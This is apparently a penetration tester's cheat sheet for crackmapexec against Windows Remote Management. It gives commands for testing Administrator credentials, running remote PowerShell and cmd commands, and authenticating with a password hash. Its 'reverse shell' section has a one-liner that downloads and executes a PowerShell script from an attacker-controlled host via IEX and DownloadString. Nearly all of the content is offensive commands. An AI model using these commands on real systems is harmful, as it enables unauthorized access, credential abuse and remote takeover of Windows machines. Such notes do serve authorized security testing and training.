# winrm

## check connection

```bash
crackmapexec winrm $rhost -u Administrator -p <some-password>
```

## run powershell command

```bash
crackmapexec winrm $rhost -u Administrator -p <some-password> -X <whoami>
```

## run cmd powershell command

```bash
crackmapexec winrm $rhost -u Administrator -p <some-password> -x <dir>
```

## reverse shell

```bash
crackmapexec winrm $rhost -u Administrator -p <password> -X "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://<lhost>:<lport>/reverse-shell/powershell.ps')\""
```

## use hash

```bash
crackmapexec winrm $rhost -u some_user -H "some-hash"
```
